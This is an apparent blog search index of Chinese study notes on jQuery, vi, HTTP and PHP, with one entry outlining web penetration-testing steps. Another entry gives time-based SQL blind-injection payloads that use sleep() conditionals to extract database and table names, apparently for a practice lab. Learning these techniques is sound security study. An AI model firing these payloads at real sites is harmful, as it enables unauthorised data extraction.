<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[jQuery事件]]></title>
    <url>%2F2018%2F11%2F30%2FjQuery%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[加载事件 12345678910111213简写：```$(function()&#123;&#125;);``` &lt;br/&gt;注意：​js:```windows.onload=fn;``` &lt;br/&gt;​jq:```$(document).ready(fn);``` &lt;br/&gt;![1](https://i.imgur.com/tSwi0ia.png)### 事件切换```js$(&quot;div&quot;).hover(function ()&#123; $(&quot;b&quot;).html(&quot;鼠标放上就变&quot;);//鼠标放到div标签中，就会变化&#125;,function ()&#123; $(&quot;a&quot;).html(&quot;鼠标离开就变&quot;);&#125;); 事件123456789101112注：selector为选择器，可以使用标签名，或者id等选中要操作的对象。$(selector).click(fn); -----selector的点击事件，会触发fn函数。$(selector).dblclick(fn);---双击事件。$(selector).focus(fn);--------获得焦点触发事件。$(selector).blur(fn);---------失去焦点。$(selector).change(fn);-------发生改变。$(selector).mouseover(fn);----鼠标放上。$(selector).mouseout(fn);-----鼠标离开。$(selector).mousedown(fn);----鼠标按下。$(selector).mouseup(fn);------鼠标抬起。$(selector).mousemove(fn);----鼠标移动。js的事件都带有on，而jq事件都没有on 鼠标移动事件注：属性是获取x坐标123456属性是获取y坐标```clientY``` 就代表了div标签对象```event``` ### 事件处理：**bind：重点** 绑定事件 -- ```bind(&quot;事件名&quot;,fn) 如果多个事件：1234567**unbind(&quot;事件名&quot;)** 解除绑定，如果没有参数，意味着，全部解除绑定![2](https://i.imgur.com/fvq7NSJ.png)**on：重点** 绑定事件 ```$(select).on(&quot;clcik&quot;,function ()&#123;&#125;); off解绑 $(select).off(); one：绑定事件，只会执行一次代码：$(&quot;#d1&quot;).one(&quot;click&quot;,function (){alert (&quot;你好，世界&quot;);});执行一次后就失效。 查找：$(selector).parent()—–查找父元素。$(selector).find(a)——在selector中找a元素。]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi —— 终端中的编辑器]]></title>
    <url>%2F2018%2F11%2F25%2Fvi%E2%80%94%E7%BB%88%E7%AB%AF%E4%B8%AD%E7%9A%84%E7%BC%96%E8%BE%91%E5%99%A8%2F</url>
    <content type="text"><![CDATA[目标 vi 简介 打开和新建文件 三种工作模式 常用命令 分屏命令 常用命令速查图 01. vi 简介1.1 学习 vi 的目的 在工作中，要对 服务器 上的文件进行 简单 的修改，可以使用 ssh 远程登录到服务器上，并且使用 vi 进行快速的编辑即可 常见需要修改的文件包括： 源程序 配置文件，例如 ssh 的配置文件 ~/.ssh/config 在没有图形界面的环境下，要编辑文件，vi 是最佳选择！ 每一个要使用 Linux 的程序员，都应该或多或少的学习一些 vi 的常用命令 1.2 vi 和 vim 在很多 Linux 发行版中，直接把 vi 做成 vim 的软连接 vi vi 是 Visual interface 的简称，是 Linux 中 最经典 的文本编辑器 vi 的核心设计思想 —— 让程序员的手指始终保持在键盘的核心区域，就能完成所有的编辑操作 vi 的特点： 没有图形界面 的 功能强大 的编辑器 只能是编辑 文本内容，不能对字体、段落进行排版 不支持鼠标操作 没有菜单 只有命令 vi 编辑器在 系统管理、服务器管理 编辑文件时，其功能永远不是图形界面的编辑器能比拟的 vimvim = vi improved vim 是从 vi 发展出来的一个文本编辑器，支持 代码补全、编译 及 错误跳转 等方便编程的功能特别丰富，在程序员中被广泛使用，被称为 编辑器之神 查询软连接命令（知道） 在很多 Linux 发行版中直接把 vi 做成 vim 的软连接 123456789101112# 查找 vi 的运行文件$ which vi$ ls -l /usr/bin/vi$ ls -l /etc/alternatives/vi$ ls -l /usr/bin/vim.basic# 查找 vim 的运行文件$ which vim$ ls -l /usr/bin/vim$ ls -l /etc/alternatives/vim$ ls -l /usr/bin/vim.basic 02. 打开和新建文件 在终端中输入 vi 在后面跟上文件名 即可 1$ vi 文件名 如果文件已经存在，会直接打开该文件 如果文件不存在，会新建一个文件 2.1 打开文件并且定位行 在日常工作中，有可能会遇到 打开一个文件，并定位到指定行 的情况 例如：在开发时，知道某一行代码有错误，可以 快速定位 到出错代码的位置 这个时候，可以使用以下命令打开文件 1$ vi 文件名 +行数 提示：如果只带上 + 而不指定行号，会直接定位到文件末尾 2.2 异常处理 如果 vi 异常退出，在磁盘上可能会保存有 交换文件 下次再使用 vi 编辑该文件时，会看到以下屏幕信息，按下字母 d 可以 删除交换文件 即可 提示：按下键盘时，注意关闭输入法 03. 三种工作模式 vi 有三种基本工作模式： 命令模式 打开文件首先进入命令模式，是使用 vi 的 入口 通过 命令 对文件进行常规的编辑操作，例如：定位、翻页、复制、粘贴、删除…… 在其他图形编辑器下，通过 快捷键 或者 鼠标 实现的操作，都在 命令模式 下实现 末行模式 —— 执行 保存、退出 等操作 要退出 vi 返回到控制台，需要在末行模式下输入命令 末行模式 是 vi 的 出口 编辑模式 —— 正常的编辑文字 提示：在 Touch Bar 的 Mac 电脑上 ，按 ESC 不方便，可以使用 CTRL + [ 替代 末行模式命令 命令 英文 功能 w write 保存 q quit 退出，如果没有保存，不允许退出 q! quit 强行退出，不保存退出 wq write &amp; quit 保存并退出 x 保存并退出 04. 常用命令命令线路图 重复次数 在命令模式下，先输入一个数字，再跟上一个命令，可以让该命令 重复执行指定次数 移动和选择（多练） vi 之所以快，关键在于 能够快速定位到要编辑的代码行 移动命令 能够 和 编辑操作 命令 组合使用 编辑操作 删除、复制、粘贴、替换、缩排 撤销和重复 查找替换 编辑 学习提示 vi 的命令较多，不要期望一下子全部记住，个别命令忘记了，只是会影响编辑速度而已 在使用 vi 命令时，注意 关闭中文输入法 4.1 移动（基本） 要熟练使用 vi，首先应该学会怎么在 命令模式 下样快速移动光标 编辑操作命令，能够和 移动命令 结合在一起使用 1) 上、下、左、右 命令 功能 手指 h 向左 食指 j 向下 食指 k 向上 中指 l 向右 无名指 2) 行内移动 命令 英文 功能 w word 向后移动一个单词 b back 向前移动一个单词 0 行首 ^ 行首，第一个不是空白字符的位置 $ 行尾 3) 行数移动 命令 英文 功能 gg go 文件顶部 G go 文件末尾 数字gg go 移动到 数字 对应行数 数字G go 移动到 数字 对应行数 :数字 移动到 数字 对应行数 4) 屏幕移动 命令 英文 功能 Ctrl + b back 向上翻页 Ctrl + f forward 向下翻页 H Head 屏幕顶部 M Middle 屏幕中间 L Low 屏幕底部 4.2 移动（程序）1) 段落移动 vi 中使用 空行 来区分段落 在程序开发时，通常 一段功能相关的代码会写在一起 —— 之间没有空行 命令 功能 { 上一段 } 下一段 2) 括号切换 在程序世界中，()、[]、{} 使用频率很高，而且 都是成对出现的 命令 功能 % 括号匹配及切换 3) 标记 在开发时，某一块代码可能需要稍后处理，例如：编辑、查看 此时先使用 m 增加一个标记，这样可以 在需要时快速地跳转回来 或者 执行其他编辑操作 标记名称 可以是 a~z 或者 A~Z 之间的任意 一个 字母 添加了标记的 行如果被删除，标记同时被删除 如果 在其他行添加了相同名称的标记，之前添加的标记也会被替换掉 命令 英文 功能 mx mark 添加标记 x，x 是 a~z 或者 A~Z 之间的任意一个字母 ‘x 直接定位到标记 x 所在位置 4.3 选中文本（可视模式） 学习 复制 命令前，应该先学会 怎么样选中 要复制的代码 在 vi 中要选择文本，需要先使用 Visual 命令切换到 可视模式 vi 中提供了 三种 可视模式，可以方便程序员选择 选中文本的方式 按 ESC 可以放弃选中，返回到 命令模式 命令 模式 功能 v 可视模式 从光标位置开始按照正常模式选择文本 V 可视行模式 选中光标经过的完整行 Ctrl + v 可视块模式 垂直方向选中文本 可视模式下，可以和 移动命令 连用，例如：ggVG 能够选中所有内容 4.4 撤销和恢复撤销 在学习编辑命令之前，先要知道怎样撤销之前一次 错误的 编辑动作！ 命令 英文 功能 u undo 撤销上次命令 CTRL + r redo 恢复撤销的命令 4.5 删除文本 命令 英文 功能 x cut 删除光标所在字符，或者选中文字 d(移动命令) delete 删除移动命令对应的内容 dd delete 删除光标所在行，可以 ndd 复制多行 D delete 删除至行尾 提示：如果使用 可视模式 已经选中了一段文本，那么无论使用 d 还是 x，都可以删除选中文本 删除命令可以和 移动命令 连用，以下是常见的组合命令： 123456* dw # 从光标位置删除到单词末尾* d0 # 从光标位置删除到一行的起始位置* d&#125; # 从光标位置删除到段落结尾* ndd # 从光标位置向下连续删除 n 行* d代码行G # 从光标所在行 删除到 指定代码行 之间的所有代码* d&apos;a # 从光标所在行 删除到 标记a 之间的所有代码 4.6 复制、粘贴 vi 中提供有一个 被复制文本的缓冲区 复制 命令会将选中的文字保存在缓冲区 删除 命令删除的文字会被保存在缓冲区 在需要的位置，使用 粘贴 命令可以将缓冲区的文字插入到光标所在位置 命令 英文 功能 y(移动命令) copy 复制 yy copy 复制一行，可以 nyy 复制多行 p paste 粘贴 提示 命令 d、x 类似于图形界面的 剪切操作 —— CTRL + X 命令 y 类似于图形界面的 复制操作 —— CTRL + C 命令 p 类似于图形界面的 粘贴操作 —— CTRL + V vi 中的 文本缓冲区同样只有一个，如果后续做过 复制、剪切 操作，之前缓冲区中的内容会被替换 注意 vi 中的 文本缓冲区 和系统的 剪贴板 不是同一个 所以在其他软件中使用 CTRL + C 复制的内容，不能在 vi 中通过 P 命令粘贴 可以在 编辑模式 下使用 鼠标右键粘贴 4.7 替换 命令 英文 功能 工作模式 r replace 替换当前字符 命令模式 R replace 替换当前行光标后的字符 替换模式 R 命令可以进入 替换模式，替换完成后，按下 ESC 可以回到 命令模式 替换命令 的作用就是不用进入 编辑模式，对文件进行 轻量级的修改 4.8 缩排和重复执行 命令 功能 &gt;&gt; 向右增加缩进 &lt;&lt; 向左减少缩进 . 重复上次命令 缩排命令 在开发程序时，统一增加代码的缩进 比较有用！ 一次性 在选中代码前增加 4 个空格，就叫做 增加缩进 一次性 在选中代码前删除 4 个空格，就叫做 减少缩进 在 可视模式 下，缩排命令只需要使用 一个 &gt; 或者 &lt; 在程序中，缩进 通常用来表示代码的归属关系 前面空格越少，代码的级别越高 前面空格越多，代码的级别越低 4.9 查找常规查找 命令 功能 /str 查找 str 查找到指定内容之后，使用 Next 查找下一个出现的位置： n: 查找下一个 N: 查找上一个 如果不想看到高亮显示，可以随便查找一个文件中不存在的内容即可 单词快速匹配 命令 功能 * 向后查找当前光标所在单词 # 向前查找当前光标所在单词 在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过 4.10 查找并替换 在 vi 中查找和替换命令需要在 末行模式 下执行 记忆命令格式： 1:%s///g 1) 全局替换 一次性替换文件中的 所有出现的旧文本 命令格式如下： 1:%s/旧文本/新文本/g 2) 可视区域替换 先选中 要替换文字的 范围 命令格式如下： 1:s/旧文本/新文本/g 3) 确认替换 如果把末尾的 g 改成 gc 在替换的时候，会有提示！推荐使用！ 1:%s/旧文本/新文本/gc y - yes 替换 n - no 不替换 a - all 替换所有 q - quit 退出替换 l - last 最后一个，并把光标移动到行首 ^E 向下滚屏 ^Y 向上滚屏 4.11 插入命令 在 vi 中除了常用的 i 进入 编辑模式 外，还提供了以下命令同样可以进入编辑模式： 命令 英文 功能 常用 i insert 在当前字符前插入文本 常用 I insert 在行首插入文本 较常用 a append 在当前字符后添加文本 A append 在行末添加文本 较常用 o 在当前行后面插入一空行 常用 O 在当前行前面插入一空行 常用 演练 1 —— 编辑命令和数字连用 在开发中，可能会遇到连续输入 N 个同样的字符 在 Python 中有简单的方法，但是其他语言中通常需要自己输入 例如：********** 连续 10 个星号 要实现这个效果可以在 命令模式 下 输入 10，表示要重复 10 次 输入 i 进入 编辑模式 输入 * 也就是重复的文字 按下 ESC 返回到 命令模式，返回之后 vi 就会把第 2、3 两步的操作重复 10 次 提示：正常开发时，在 进入编辑模式之前，不要按数字 演练 2 —— 利用 可视块 给多行代码增加注释 在开发中，可能会遇到一次性给多行代码 增加注释 的情况 在 Python 中，要给代码增加注释，可以在代码前增加一个 # 要实现这个效果可以在 命令模式 下 移动到要添加注释的 第 1 行代码，按 ^ 来到行首 按 CTRL + v 进入 可视块 模式 使用 j 向下连续选中要添加的代码行 输入 I 进入 编辑模式，并在 行首插入，注意：一定要使用 I 输入 # 也就是注释符号 按下 ESC 返回到 命令模式，返回之后 vi 会在之前选中的每一行代码 前 插入 # 05. 分屏命令 属于 vi 的高级命令 —— 可以 同时编辑和查看多个文件 5.1 末行命令扩展末行命令 主要是针对文件进行操作的：保存、退出、保存&amp;退出、搜索&amp;替换、另存、新建、浏览文件 命令 英文 功能 :e . edit 会打开内置的文件浏览器，浏览要当前目录下的文件 :n 文件名 new 新建文件 :w 文件名 write 另存为，但是仍然编辑当前文件，并不会切换文件 提示：切换文件之前，必须保证当前这个文件已经被保存！ 已经学习过的 末行命令： 命令 英文 功能 :w write 保存 :q quit 退出，如果没有保存，不允许退出 :q! quit 强行退出，不保存退出 :wq write &amp; quit 保存并退出 :x 保存并退出 :%s///gc 确认搜索并替换 在实际开发中，可以使用 w 命令 阶段性的备份代码 5.2 分屏命令 使用 分屏命令，可以 同时编辑和查看多个文件 命令 英文 功能 :sp [文件名] split 横向增加分屏 :vsp [文件名] vertical split 纵向增加分屏 1) 切换分屏窗口 分屏窗口都是基于 CTRL + W 这个快捷键的，w 对应的英文单词是 window 命令 英文 功能 w window 切换到下一个窗口 r reverse 互换窗口 c close 关闭当前窗口，但是不能关闭最后一个窗口 q quit 退出当前窗口，如果是最后一个窗口，则关闭 vi o other 关闭其他窗口 2) 调整窗口大小 分屏窗口都是基于 CTRL + W 这个快捷键的，w 对应的英文单词是 window 命令 英文 功能 + 增加窗口高度 - 减少窗口高度 &gt; 增加窗口宽度 &lt; 减少窗口宽度 = 等分窗口大小 调整窗口宽高的命令可以和数字连用，例如：5 CTRL + W + 连续 5 次增加高度 06. 常用命令速查图 vimrc vimrc 是 vim 的配置文件，可以设置 vim 的配置，包括：热键、配色、语法高亮、插件 等 Linux 中 vimrc 有两个位置，家目录下的配置文件优先级更高 12/etc/vim/vimrc~/.vimrc 常用的插件有： 代码补全 代码折叠 搜索 Git 集成 …… 网上有很多高手已经配置好的针对 python 开发的 vimrc 文件，可以下载过来直接使用，或者等大家多 Linux 比较熟悉后，再行学习！]]></content>
      <categories>
        <category>vi —— 终端中的编辑器</category>
      </categories>
      <tags>
        <tag>vi —— 终端中的编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用渗透测试流程]]></title>
    <url>%2F2018%2F11%2F02%2Fweb%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Web应用渗透测试对于web应用的测试，一般分为三个阶段：信息收集、漏洞发现以及漏洞利用。 信息收集在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。 脚本语言的类型常见的脚本语言的类型包括：php、asp、aspx、jsp等。测试方法 爬取网站所有链接，查看后缀 直接访问一个不存在页面后面加不同后缀测试 查看robots.txt，查看后缀 服务器的类型常见的web服务器包括：apache、tomcat、iis、ngnix等测试方法 查看header，判断服务器类型 根据报错信息判断 根据默认页面判断目录结构了解更多的目录，可能发现更多的弱点，如：目录浏览、代码泄漏等。测试方法 使用字典枚举目录 使用爬虫爬取整个网站，或者使用google等搜索引擎获取 查看robots.txt是否泄漏使用的开源软件我们如果知道了目标使用的开源软件，我们查找相关的软件的漏洞直接对网站进行测试。测试方法指纹识别(网上在线的指纹识别工具，例：云溪指纹识别) 数据库类型对于不同的数据库，有不同的测试方法。测试方法 使用应用程序报错，查看报错信息 扫描服务器的数据库端口（没做NAT且防火墙不过滤时有效）所有链接页面这个跟前面的获取目录结构类似，但是这个不是获取网站的所有功能页面，有时候还可以获取到管理员备份的源码。测试方法 使用字典枚举页面 使用爬虫爬取整个网站，或者使用google等搜索引擎获取 查看robots.txt是否泄漏用到的框架很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。测试方法指纹识别漏洞发现在这个阶段我们在做测试的时候要对症下药，不能盲目的去扫描，首先要确定目标应用是否使用的是公开的开源软件、开源框架等，然后在做深一度的漏洞扫描。关于开源软件的漏洞发现开源软件常见的开源软件有：wordpress、phpbb、dedecms等。开源的框架常见的开源框架有：struts2、spring MVC、thinkPHP等。中间件服务器常见的中间件服务器有：jboss、tomcat、Weblogic等。数据库服务常见的数据库服务：mssql、mysql、oracle、redis、sybase、MongoDB、DB2等。对开源软件的测试方法 通过指纹识别软件判断开源的版本信息，针对不同的版本信息去开放的漏洞数据库查找相应版本的漏洞进行测试 对于默认的后台登入页、数据库服务端口认证等入口可以进行简单的暴力破解、默认口令尝试等操作。 使用开源的漏洞发现工具对其进行漏洞扫描，如：WPScan关于自主开发的应用手动测试这个阶段，我们需要手工测试所有与用户交互的功能，比如：留言、登入、下单、退出、退货、付款等操作。软件扫描使用免费的软件扫描，如：appscan、wvs、netsparker、burp等漏洞利用这种方式对于有特殊过滤等操作，或者网络上没有成型的利用工具的时候可以使用，在熟练之后，自己也可以写出自己的利用工具代替手工操作，毕竟手工操作是非常累的。有时候可以结合服务器的配置问题，增加成功率。]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议]]></title>
    <url>%2F2018%2F10%2F27%2Fhttp%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[HTTP协议HTTP–Hyper Text Transfer Protocol(超文本传输协议)，是用于从互联网服务器传输超文本到本地浏览器的传输协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML文件、图片、查询结果等）。 HTTP工作原理HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。 Web服务器有：Apache服务器，iis服务器等。Web服务器根据接收到的请求后，向客户端发送响应信息。HTTP默认端口号为80，但是你可以改为8080或其他端口号。HTTP三点注意事项： HTTP是无连接：无连接的含义是限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式节省传输时间。 HTTP是媒体独立的：这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。 HTTP是无状态：HTTP协议是无状态协议。无状态是指协议对事务处理没有记忆功能。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 转载至菜鸟教程-HTTP简介]]></content>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql时间盲注]]></title>
    <url>%2F2018%2F10%2F25%2Fsql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[sql基于时间的盲注知识点1.时间检测盲注使用的函数 检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+ 3.检测表名检测表名长度 1and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+ 检测表名 1and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php可变个数参数的函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8F%AF%E5%8F%98%E4%B8%AA%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php可变个数参数的函数php获取可变函数参数的函数php取得可变函数参数，方便后面的控制。 func_num_args()返回传递给该函数参数的个数 func_get_arg($arg_num)取得指定位置的参数值，$arg_num位置index从0开始到n-1。 fun_get_args()返回包含所有参数的数组]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php可变变量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php可变变量将变量名储存到另一个变量中 123456&lt;?phpheader("content-type:text/html;charset=utf-8"); $a="我是一个变量！"; $b='a'; $echo $$b;?&gt; $$b:$b里保存的是变量a，$a=&quot;我是一个变量！&quot;，所以$$b的值是&quot;我是一个变量！&quot; 多学一招：变量中不但可以保存变量名，还可以保存函数名。]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php静态变量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php静态变量Static（静态）关键字 1.在函数中声明的静态变量，只在调用时声明。2.第二次以后，一看是静态变量，就先到静态区中，看一下有没有这个变量，如果有就使用，而不去再声明。3.静态变量 ，在同一个函数多次调用中，共享把局部变量改变为静态变量后是改变了它的存储方式，即改变了它的生存期。把全局变量改变为静态变量后是改变了它的作用域，限制了它的使用范围。static静态变量会被放在程序的全局存储区中（即在程序的全局数据区，而不是在堆栈中分配，所以不会导致堆栈溢出），这样可以在下一次调用的时候还可以保持原来的赋值。这一点是它与堆栈变量和堆变量的区别。 代码示例： 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//--------------如何理解static静态变量----------- /** 普通局部变量 */function local() &#123; $loc = 0; //这样，如果直接不给初值0是错误的。 ++$loc; echo $loc . '&lt;br&gt;';&#125;local(); //1local(); //1local(); //1echo '===================================&lt;br/&gt;'; /** static静态局部变量 */function static_local() &#123; static $local = 0 ; //此处可以不赋0值 $local++; echo $local . '&lt;br&gt;';&#125;static_local(); //1static_local(); //2static_local(); //3//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。echo '=======================================&lt;br&gt;'; /** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */function static_global() &#123; global $glo; //此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，但是不能想//当然的写上"static"加以修饰，那样是错误的. $glo++; echo $glo . '&lt;br&gt;';&#125;static_global(); //1static_global(); //2static_global(); //3?&gt; 静态局部变量： 1.static类型的内部变量同auto自动变量（即未加static声明的局部变量）一样，是某个特定函数的局部变量，即只能在定义该变量的函数内使用该变量，两者作用域相同；两者的不同在于：auto自动变量会随着函数被调用和退出而存在和消失，而static类局部变量不会，它不管其所在的函数是否被调用，都将一直存在；不过，尽管该变量还继续存在，但不能使用它。倘若再次调用定义它的函数时，它又可继续使用，而且保存了前次被调用后的值。换言之，static类型的局部变量是一种只能在某个特定函数中使用，但一直占据储存空间的变量。 2.函数体内如果在定义静态变量的同时进行了初始化，则以后程序不在进行初始化操作（出现在函数内部的基本类型的静态变量初始化语句只有在第一次调用才执行）。而对自动变量赋初值是在函数调用时进行，每调用一次函数重新给一次初值3，相当于执行一次赋值语句。 3.静态局部变量的初始化表达式必须是一个常量表达式。即使局部静态变量定义时没有赋初值，]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php进制]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E8%BF%9B%E5%88%B6%2F</url>
    <content type="text"><![CDATA[php进制关于进制的表格： 进制 缩写 单词 十进制 dec decimalist 八进制 oct otconary 二进制 bin binary 十六进制 hex hexadecimal php进制转换函数： decbin()--------十进制 转 二进制 decoct()--------十进制 转 八进制 bindec()--------二进制 转 十进制 我们发现缩写组合一下就是 什么进制 转 什么进制。 php变量中可以存十进制、八进制、十六进制。 php变量5.4之前版本不能储存 二进制。 php进制变量声明： $a = 123 //十进制 $a = 023 //八进制 $a = 0x1A //十六进制]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php回调函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php回调函数回调函数：Callback（即call then back 被主函数调用运算后会返回主函数），是指通过函数参数传递到其他代码的，某一块可执行代码的引用。通俗的解释就是把函数作为参数传入进；另一个函数中使用；php中有许多“需求参数为函数”的函数，像array_map,usort,call_user_func_array之类，它们执行传入函数，然后直接将结果返回主函数。好处是函数作为值使用起来方便，而且代码简洁，可读性强。 php中回调函数的实现 php提供了两个内置函数call_user_func()和call_user_func_array()提供对回调函数的支持。这两个函数的区别是call_user_func_array是以数组的形式接收回调函数的参数的，看它的原型就知道了：mixed call_user_func_array(callable $callback,array $param_arr),它只有两个参数。而call_user_func($callback,参数1,,参数2,…)的参数个数根据回调函数的参数来决定的。 如何实现对脚本中全局函数、类中未使用$this的非静态方法、类中使用$this的非静态方法（需要传入对象）、类中静态方法的回调呢？ 实例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php //普通函数 function f1($arg1,$arg2)&#123; echo __FUNCTION__.'exec,the args is:'.$arg1.' '.$arg2; echo "&lt;br /&gt;"; &#125; //通过call_user_func调用函数f1 call_user_func('f1','han','wen'); //通过call_user_func_array调用函数 call_user_func_array('f1',array('han','wen')); class A &#123; public $name; function show($arg1) &#123; echo 'the arg is:'.$arg1."&lt;br /&gt;"; echo 'my name is:'.$this-&gt;name; echo "&lt;br /&gt;"; &#125; function show1($arg1,$arg2) &#123; echo __METHOD__.'exec,the args is:'.$arg1.' '.$arg2."&lt;br /&gt;"; &#125; public static function show2($arg1,$arg2) &#123; echo __METHOD__.'of class A exec,the args is:'.$arg1.' '.$arg2."&lt;br /&gt;"; &#125; &#125; //调用类中非静态成员函数，该成员函数中有$this调用了对象中的成员 $a = new A; $a-&gt;name = 'wen'; call_user_func_array(array($a,'show'),array('han!')); //调用类中非静态成员函数，没有对象被创建，该成员函数中不能有$this call_user_func_array(array('A','show1'),array('an!','wen')); //调用中静态成员函数 call_user_func_array(array('A','show2'),array('argument1','argument2')); ?&gt;]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php访问控制]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[访问控制（可见性） 对属性或方法的访问控制，是通过在前面添加关键字public（公有），protected（受保护）或private（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。 属性的访问控制 类属性必须定义为公有，受保护，私有之一。如果用var定义，则被视为公有。 #####属性声明： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php/** * 定义类 MyClass */class MyClass&#123; public $public = 'Public(公有)'; protected $protected = 'Protected(受保护)'; private $private = 'Private(私有)'; function printHello() &#123; echo $this-&gt;public; echo $this-&gt;protected; echo $this-&gt;private; &#125;&#125;$obj = new MyClass();echo $obj-&gt;public; //这行能被正常执行echo $obj-&gt;protected; //这行会产生一个致命错误echo $obj-&gt;private; //这行也会产生一个致命错误$obj-&gt;printHello(); //输出 Public(公有)、Protected(受保护) 和 Private(私有)/** * 定义类 MyClass2 */class MyClass2 extends MyClass&#123; //可以对 public 和 protected 进行重定义，但 private 不能 protected $protected = 'Protected2(受保护)'; function printHello() &#123; echo $this-&gt;public; echo $this-&gt;protected; echo $this-&gt;private; &#125;&#125;$obj2 = new MyClass2();echo $obj2-&gt;public; //这行能被执行echo $obj2-&gt;private; //未定义 privateecho $obj2-&gt;protected; //这行会产生一个致命错误$obj2-&gt;printHello(); //输出 Public、Protected2(受保护)、和 Undefined?&gt; 方法的访问控制 类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。 方法声明：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?php/** *定义类 MyClass */class MyClass&#123; //声明一个公有的构造函数 public function __construct()&#123;&#125; //声明一个公有的方法 public function MyPublic()&#123;&#125; //声明一个受保护的方法 protected function MyProtected()&#123;&#125; //声明一个私有的方法 private function MyPrivate()&#123;&#125; //此方法为公有 function Foo() &#123; $this-&gt;MyPublic(); $this-&gt;MyProtected(); $this-&gt;MyPrivate(); &#125;&#125;$myclass = new MyClass;$myclass-&gt;MyPublic(); //这行能被正常执行$myclass-&gt;MyProtected(); //这行会产生一个致命错误$myclass-&gt;MyPrivate(); //这行会产生一个致命错误$myclass-&gt;Foo(); //公有，受保护，私有都可执行/** *定义类 MyClass2 */class MyClass2 extends MyClass&#123; //此方法为公有 function Foo2() &#123; $this-&gt;MyPublic(); $this-&gt;MyProtected(); $this-&gt;MyPrivate(); //这行会产生一个致命错误 &#125;&#125;$myclass2 = new MyClass2;$myclass2-&gt;MyPublic(); //这行能被正常执行$myclass2-&gt;Foo2(); //公有的和受保护的都可执行，但私有的不行class Bar&#123; public function test()&#123; $this-&gt;testPrivate(); $this-&gt;testPublic(); &#125; public function testPublic()&#123; echo "Bar::testPublic\n"; &#125; private function testPrivate()&#123; echo "Bar::testPrivate\n"; &#125;&#125;class Foo extends Bar&#123; public function testPublic()&#123; echo "Foo::testPublic\n"; &#125; private function testPrivate()&#123; echo "Foo::testPrivate\n"; &#125;$myFoo = new foo();$myFoo-&gt;test(); //Bar::testPrivate //Foo::testPublic?&gt;]]></content>
      <tags>
        <tag>php学习</tag>
        <tag>public（公有）</tag>
        <tag>protected（受保护）</tag>
        <tag>private（私有）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php递归]]></title>
